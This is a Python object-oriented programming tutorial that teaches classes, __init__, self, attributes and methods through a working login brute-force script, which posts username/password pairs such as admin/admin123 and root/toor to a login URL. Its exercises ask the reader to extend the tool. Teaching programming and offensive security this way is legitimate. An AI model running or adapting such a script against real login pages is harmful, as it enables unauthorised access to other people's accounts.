## 🔓 Real-World Cybersecurity Use Case
Imagine you're developing a login brute-force tool. You want to store each target's login page and a list of usernames/passwords. You'll also need methods to try credentials and store results.
Attributes represent the tool's settings; methods represent the tool's actions.

## 💻 Python Code First – Brute Force Tool Example
```python
import requests

class LoginBruteForcer:
    def __init__(self, target_url):
        self.target_url = target_url  # attribute
        self.successful_logins = []   # attribute

    def try_login(self, username, password):  # method
        response = requests.post(self.target_url, data={'username': username, 'password': password})
        if "Welcome" in response.text:
            print(f"[+] Login successful: {username}:{password}")
            self.successful_logins.append((username, password))

    def run(self, wordlist):  # method
        for username, password in wordlist:
            self.try_login(username, password)

# Example usage
if __name__ == "__main__":
    wordlist = [('admin', 'admin123'), ('admin', '123456'), ('root', 'toor')]
    bruteforcer = LoginBruteForcer("http://example.com/login")
    bruteforcer.run(wordlist)
```

## 📘 Concept Explanation

### 🔑 What is `__init__`?

- `__init__` is a **special method** in Python classes.
- It runs **automatically** when you create a new object from the class.
- It's called the **constructor** because it “constructs” the object and sets up its initial attributes.

Example:
```python
bruteforcer = LoginBruteForcer("http://example.com/login")
```
This line automatically triggers `__init__()` and assigns the URL to `self.target_url`.

---

### 🔁 What is `self`?

- `self` refers to the **current object**.
- It allows each object to keep **its own copy** of variables and methods.
- Without `self`, all objects would share the same data.

```python
self.target_url = target_url
```
This means: "store the given `target_url` into this specific object’s `target_url`."

---

### What Are Attributes?

Attributes are variables attached to an object.
They store information about the object’s current state.

In our example:
- `target_url` is an attribute that holds the login page URL.
- `successful_logins` stores valid login combinations found.

---

### What Are Methods?

Methods are functions defined inside a class.
They describe what the object can do.

In our tool:
- `try_login()` is a method that tries a username/password.
- `run()` is a method that loops through credentials.

---

## 🛠 Offensive Security Application

Attributes and methods are key when building:

- Brute-force tools (store targets, handle attempts)
- Port scanners (track open ports, define scan logic)
- Exploit chains (track vulnerable targets, run steps)

They help organize logic cleanly:

- **Attributes** = tool configuration or state (IP, ports, credentials)
- **Methods** = actions your tool performs (scan, send, fuzz, etc.)

---

## 🔐 Connection to SOLID

This strengthens the **Single Responsibility Principle (SRP)**:

> “Each method should have one job.”

- `try_login()` only tries one login
- `run()` handles the loop
- `__init__` sets up the object

Keeping logic modular helps you test and reuse code.

## ✅ Exercises / Next Steps

➕ Add an attribute to limit failed login attempts.  
📊 Add a method to print a summary report of results.  
🔐 Extend the tool to support a login form with custom field names (e.g., user, pass).
